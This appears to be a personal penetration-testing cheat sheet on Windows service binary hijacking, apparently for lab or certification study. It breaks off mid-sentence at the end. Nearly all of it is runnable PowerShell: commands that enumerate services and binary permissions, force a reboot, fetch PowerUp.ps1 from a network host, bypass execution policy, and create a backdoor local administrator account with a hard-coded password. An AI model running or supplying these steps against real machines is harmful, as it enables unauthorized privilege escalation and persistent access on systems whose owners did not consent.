# Service Binary Hijacking-MacBook Pro


Get a list of all installed windows services
```powershell
Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}
```

Check permissions on a binary
```powershell
icacls "C:\xampp\apache\bin\httpd.exe"
```

Stopping a service
```powershell
net stop mysql
```

Check if service starts on boot
```powershell
Get-CimInstance -ClassName win32_service | Select Name, StartMode | Where-Object {$_.Name -like 'mysql'}

#if the service is set to auto check privileges
whoami /priv

#if SeShutDownPrivilege
shutdown /r /t 0
```

Use PowerUp.ps1 to check for modifiable service files
```powershell
iwr -uri http://192.168.48.3/PowerUp.ps1 -Outfile PowerUp.ps1
powershell -ep bypass
. .\PowerUp.ps1
Get-ModifiableServiceFile

#if the file is directly abusable we can just run this
Install-ServiceBinary -Name 'mysql'
#this will create a user john:Password123! and add to local administrator group. However, do rememeber to further manually en
```
